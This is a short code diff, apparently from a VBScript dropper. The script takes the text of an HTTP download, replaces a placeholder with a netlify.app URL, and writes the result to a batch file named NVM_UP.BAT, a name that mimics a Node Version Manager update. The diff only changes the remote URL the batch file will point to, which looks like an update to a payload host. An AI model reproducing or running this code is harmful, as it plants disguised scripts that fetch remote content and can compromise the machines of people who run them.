@@ -34,7 +34,7 @@ If http.Status = 200 Then
     d = t.ReadAll
     t.Close
 
-    d = Replace(d, "****", "'https://n-new-server.netlify.app/files/c-f/temp/new/1.txt'")
+    d = Replace(d, "****", "'https://gleaming-youtiao-b2b188.netlify.app/files/output.txt'")
 
     Set t = fso.OpenTextFile(p & "\NVM_UP.BAT", 2, True)
     t.Write d
